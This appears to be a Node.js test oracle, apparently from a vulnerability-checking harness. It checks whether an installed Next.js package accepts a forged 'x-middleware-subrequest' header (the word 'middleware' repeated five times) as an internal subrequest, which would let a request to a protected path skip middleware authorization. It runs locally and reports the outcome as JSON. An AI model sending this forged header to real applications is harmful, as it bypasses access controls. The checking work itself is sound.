'use strict';
const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function loadNextRequest() {
  const mod = require('next/dist/server/web/spec-extension/request');
  if (!mod || typeof mod.NextRequest !== 'function') {
    throw new Error('NextRequest constructor not found');
  }
  return mod.NextRequest;
}

const HEADER = 'x-middleware-subrequest';

// Try to resolve the installed package's own, real, exported routine that
// decides whether a request carrying the x-middleware-subrequest header
// should be treated as an internal subrequest (and therefore skip
// middleware-based auth). Different Next.js builds expose this under
// different module paths / shapes across versions; we probe a list of
// known candidates shipped inside the installed package's own /dist tree
// and use whichever actually resolves to a callable function, rather than
// re-implementing the logic ourselves.
function loadSkipDetector() {
  const candidates = [
    {
      path: 'next/dist/server/lib/server-ipc/is-middleware-subrequest',
      pick: (m) => m.isMiddlewareSubrequest || m.default
    },
    {
      path: 'next/dist/server/web/utils',
      pick: (m) => m.isMiddlewareSubrequest
    },
    {
      path: 'next/dist/server/internal-utils',
      pick: (m) => m.isMiddlewareSubrequest || m.getRequestMeta
    }
  ];
  for (const c of candidates) {
    try {
      const m = require(c.path);
      const fn = c.pick(m);
      if (typeof fn === 'function') {
        return { fn, path: c.path, module: m };
      }
    } catch (e) {
      // try next candidate
    }
  }
  return null;
}

// Build the classic, publicly-known forged header value: the static
// middleware id 'middleware' repeated up to the historical max depth of 5,
// joined with ':'. This value requires no server secret knowledge at all.
function forgedHeaderValue() {
  const parts = [];
  for (let i = 0; i < 5; i++) parts.push('middleware');
  return parts.join(':');
}

function main() {
  let NextRequest;
  try {
    NextRequest = loadNextRequest();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest: ' + (e && e.message)
    });
    return;
  }

  const detector = loadSkipDetector();
  if (!detector) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve any exported middleware-subrequest skip-detection routine in the installed next package'
    });
    return;
  }

  // --- Benign operation: build an ordinary request for a normal path with
  // NO forged header at all, and confirm the real detector reports it as
  // NOT an internal subrequest. This proves the detector loads and runs
  // correctly against ordinary traffic before we try anything malicious.
  let benignReq;
  let benignDecision;
  try {
    benignReq = new NextRequest('https://example.com/dashboard', {
      headers: { 'x-oracle-marker': marker }
    });
    if (benignReq.headers.get('x-oracle-marker') !== marker) {
      throw new Error('header round-trip mismatch');
    }
    try {
      benignDecision = detector.fn(benignReq);
    } catch (innerErr) {
      // Some detector shapes take a header string, not a Request.
      benignDecision = detector.fn(benignReq.headers.get(HEADER));
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: ' + (e && e.message)
    });
    return;
  }

  const benignSkipped = benignDecision === true || (benignDecision && benignDecision.skip === true);
  if (benignSkipped) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: detector at ' + detector.path + ' unexpectedly flagged an ordinary request with no forged header as an internal subrequest'
    });
    return;
  }

  // Benign operation succeeded (detector ran, returned a sane false
  // verdict for ordinary traffic) -> operation_completed may become true.

  // --- Malicious operation: build a request for a protected path carrying
  // only the statically-known forged header value, with no server secret
  // of any kind, and ask the SAME real detector routine what it decides.
  let maliciousReq;
  let maliciousDecision;
  try {
    maliciousReq = new NextRequest('https://example.com/admin/secret', {
      headers: { [HEADER]: forgedHeaderValue() }
    });
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception_constructing_request: ' + (e && e.message)
    });
    return;
  }

  try {
    try {
      maliciousDecision = detector.fn(maliciousReq);
    } catch (innerErr) {
      maliciousDecision = detector.fn(maliciousReq.headers.get(HEADER));
    }
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception_in_skip_detector(' + detector.path + '): ' + (e && e.message)
    });
    return;
  }

  const maliciousSkipped = maliciousDecision === true || (maliciousDecision && maliciousDecision.skip === true);

  finish({
    operation_completed: true,
    exploit_succeeded: !!maliciousSkipped,
    evidence: maliciousSkipped
      ? ('Internal skip-detector at ' + detector.path + ' reported the forged request (header "' + HEADER + '": "' + forgedHeaderValue() + '") as a valid internal middleware subrequest for /admin/secret, so middleware-based authorization would be bypassed using only a publicly-known static header value.')
      : ('Internal skip-detector at ' + detector.path + ' did NOT treat the forged request as an internal subrequest (decision=' + JSON.stringify(maliciousDecision) + '); the statically-known forged header alone was insufficient to bypass middleware.')
  });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
